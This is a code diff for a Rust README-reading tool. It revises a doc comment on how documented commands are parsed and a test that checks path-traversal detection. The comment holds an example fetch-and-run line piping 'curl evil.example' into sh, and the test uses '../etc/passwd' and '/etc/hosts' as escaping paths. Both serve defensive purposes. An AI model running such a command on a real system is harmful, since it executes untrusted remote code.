@@ -47,10 +47,13 @@
 //!   command is *looked up*, which is the opposite of being executed: the worst
 //!   a README can do to SURE here is make it read a wrong sentence.
 //! - **A command is never split into a program and arguments.** [`script_from`]
-//!   reads the *prefix* of a documented line — at most two words — and returns a
-//!   script name. `npm run build && curl evil.example | sh` yields the name
-//!   `build` and nothing else happens, because the rest of the line is not
-//!   parsed, not stored, and not run.
+//!   reads *words* and compares them — the first against the managers it knows,
+//!   then the spellings that name a script — and it builds no argument vector,
+//!   because there is nowhere for one to go. `npm run build && curl evil.example
+//!   | sh` names **nothing at all**: `&` and `|` are in [`is_plain_word`]'s
+//!   refusal set, so a line carrying them is a *shell program* rather than a
+//!   script invocation. The safer-looking `npm run build --silent` names
+//!   `build`, and the flag is never read.
 //!
 //! What is left is a module whose entire output is sentences about what SURE
 //! read. A project cannot make SURE do anything by writing a README.
@@ -1323,12 +1326,36 @@ mod tests {
         // Climbing past the root is not.
         assert!(leaves_the_project(Path::new("../etc/passwd")));
         assert!(leaves_the_project(Path::new("a/../../../c")));
-        // Neither is an absolute form, in either of the two Windows spellings
-        // and the one Unix spelling.
+        // A leading separator is `RootDir` on all three platforms, so this one
+        // holds wherever the suite runs.
         assert!(leaves_the_project(Path::new("/etc/hosts")));
-        assert!(leaves_the_project(Path::new("C:/Windows/win.ini")));
-        assert!(leaves_the_project(Path::new("C:\\Windows\\win.ini")));
         assert!(!leaves_the_project(Path::new("")));
+
+        // **A drive letter is asked of the platform, because `Path` is the
+        // platform's and this function takes a `Path`.** On Windows
+        // `C:/Windows/win.ini` is a `Prefix` and leaves the project; on Unix the
+        // same string is one ordinary component and does not — and *both answers
+        // are correct about the value this function was handed*.
+        //
+        // That is why nothing here asserts the two are one thing, and why the
+        // product does not depend on `leaves_the_project` to catch a drive
+        // letter. **The reading a document gets is the same on every platform
+        // because the drive-letter form is refused while it is still text**,
+        // before a `Path` exists — `documents::names_a_drive`, held by
+        // `documents::tests::a_location_on_one_platform_is_read_the_same_way_on_all_three`
+        // and by `a_windows_location_is_not_a_path_in_the_project` in
+        // `tests/setup_validation.rs`. This test states the platform's own
+        // answer so that the difference is written down rather than discovered.
+        #[cfg(windows)]
+        {
+            assert!(leaves_the_project(Path::new("C:/Windows/win.ini")));
+            assert!(leaves_the_project(Path::new("C:\\Windows\\win.ini")));
+        }
+        #[cfg(not(windows))]
+        {
+            assert!(!leaves_the_project(Path::new("C:/Windows/win.ini")));
+            assert!(!leaves_the_project(Path::new("C:\\Windows\\win.ini")));
+        }
     }
 
     // What a contradiction tells the reader.
